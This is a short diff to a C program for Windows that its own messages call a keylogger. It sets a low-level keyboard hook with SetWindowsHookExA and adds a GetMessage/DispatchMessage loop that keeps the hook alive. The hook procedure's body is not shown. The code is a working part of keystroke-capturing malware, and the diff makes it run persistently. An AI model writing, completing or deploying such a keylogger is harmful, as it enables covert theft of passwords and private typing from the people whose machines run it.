@@ -8,10 +8,17 @@ LRESULT hook_proc(int code, WPARAM wParam, LPARAM lParam) {
 }
 
 int main() {
-    HHOOK hhook = SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, NULL, 0);
-    if (hhook == NULL) {
+    HHOOK keyboardhook = SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, NULL, 0);
+    if (keyboardhook == NULL) {
         printf("keylog failed\n");
     } else {
         printf("keylog started\n");
     }
+
+    MSG msg;
+    while( (GetMessage( &msg, NULL, 0, 0 )) != 0)
+    { 
+        // TranslateMessage(&msg); 
+        DispatchMessage(&msg); 
+    } 
 }
